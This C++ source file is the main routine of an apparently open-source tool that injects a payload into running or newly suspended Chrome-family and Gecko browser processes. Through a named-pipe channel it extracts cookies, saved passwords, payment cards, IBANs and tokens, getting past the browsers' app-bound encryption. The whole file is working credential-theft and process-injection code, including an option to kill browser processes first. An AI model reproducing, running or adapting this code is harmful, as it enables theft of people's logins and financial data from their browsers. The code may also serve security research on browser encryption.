// (c) Alexander 'xaitax' Hagenah
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../core/common.hpp"
#include "../core/console.hpp"
#include "../sys/internal_api.hpp"
#include "browser_discovery.hpp"
#include "browser_terminator.hpp"
#include "process_manager.hpp"
#include "pipe_server.hpp"
#include "injector.hpp"
#include <iostream>
#include <tlhelp32.h>

using namespace Injector;

struct GlobalStats {
    int successful = 0;
    int failed = 0;
    int skipped = 0;
};

DWORD FindProcessByName(const std::wstring& name) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    DWORD pid = 0;
    if (Process32FirstW(hSnapshot, &pe)) {
        do {
            if (name == pe.szExeFile) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}

void ProcessBrowser(const BrowserInfo& browser, bool verbose, bool fingerprint, bool killFirst,
                    const std::filesystem::path& output, const Core::Console& console, GlobalStats& stats) {
    
    console.BrowserHeader(browser.displayName, browser.version);

    try {
        if (killFirst) {
            console.Debug("Terminating browser processes...");
            
            BrowserTerminator terminator(console);
            TerminationOptions opts;
            opts.terminateChildren = true;
            opts.waitForExit = true;
            
            auto termStats = terminator.KillByExeName(browser.exeName, opts);
            if (termStats.processesTerminated > 0) {
                std::string pidList;
                for (size_t i = 0; i < termStats.terminatedPids.size(); ++i) {
                    if (i > 0) pidList += ", ";
                    pidList += std::to_string(termStats.terminatedPids[i]);
                }
                console.Debug("  [+] Processes terminated (PID: " + pidList + ")");
            } else {
                console.Debug("  [+] No running processes found");
            }
            Sleep(300);
        }

        ProcessManager procMgr(browser);
        DWORD existingPid = killFirst ? 0 : FindProcessByName(browser.exeName);
        bool wasCreated = false;

        if (existingPid > 0) {
            console.Info("Attaching to existing process: " + std::to_string(existingPid));
            procMgr.Attach(existingPid);
            console.Info("  [+] Attached successfully");
        } else {
            console.Info("Creating suspended process: " + Core::ToUtf8(browser.exePath));
            procMgr.CreateSuspended();
            wasCreated = true;
            console.Info("  [+] Process created (PID: " + std::to_string(procMgr.GetPid()) + ")");
        }

        PipeServer pipe(browser.type);
        pipe.Create();
        console.Debug("  [+] IPC pipe established: " + Core::ToUtf8(pipe.GetName()));

        PayloadInjector injector(procMgr, console);
        injector.Inject(pipe.GetName());

        console.Debug("Awaiting payload connection...");
        pipe.WaitForClient();
        console.Debug("  [+] Payload connected");
        
        pipe.SendConfig(verbose, fingerprint, output, browser.userDataPath, browser.isGecko);
        pipe.ProcessMessages(verbose);
        
        auto pStats = pipe.GetStats();
        if (pStats.noAbe) {
            // ABE not enabled - not a failure, just skip
            stats.skipped++;
        } else if (pStats.cookies > 0 || pStats.passwords > 0 || pStats.cards > 0 || pStats.ibans > 0 || pStats.tokens > 0) {
            console.Summary(pStats.cookies, pStats.passwords, pStats.cards, pStats.ibans, pStats.tokens,
                           pStats.profiles, (output / browser.displayName).string());
            stats.successful++;
        } else {
            console.Warn("No data extracted");
            stats.failed++;
        }
        
        if (wasCreated) {
            console.Debug("Cleaning up bridge process...");
            procMgr.Terminate();
        } else {
            console.Debug("Detaching from process (persistence maintained).");
        }

    } catch (const std::exception& e) {
        console.Error(std::string(e.what()));
        stats.failed++;
    }
}

extern "C" __declspec(dllexport) int RunChromeEngine(int argc, wchar_t* argv[]) {
    bool verbose = false;
    bool fingerprint = false;
    bool killBrowsers = false;
    std::wstring targetType;
    std::filesystem::path output = std::filesystem::current_path() / "output";

    Core::Console console(false);

    for (int i = 0; i < argc; ++i) {
        std::wstring arg = argv[i];
        if (arg == L"--verbose" || arg == L"-v") verbose = true;
        else if (arg == L"--fingerprint" || arg == L"-f") fingerprint = true;
        else if (arg == L"--kill" || arg == L"-k") killBrowsers = true;
        else if ((arg == L"--output-path" || arg == L"-o") && i + 1 < argc) output = argv[++i];
        else if (targetType.empty() && arg[0] != L'-') targetType = arg;
    }

    if (targetType.empty()) targetType = L"all";

    Core::Console mainConsole(verbose);

    if (!Sys::InitApi(verbose)) {
        return 1;
    }

    GlobalStats stats;

    if (targetType == L"all") {
        auto browsers = BrowserDiscovery::FindAll();
        if (browsers.empty()) return 0;
        std::filesystem::create_directories(output);
        for (const auto& browser : browsers) {
            ProcessBrowser(browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
        }
    } else {
        auto browser = BrowserDiscovery::FindSpecific(targetType);
        if (!browser) return 1;
        std::filesystem::create_directories(output);
        ProcessBrowser(*browser, verbose, fingerprint, killBrowsers, output, mainConsole, stats);
    }

    return 0;
}
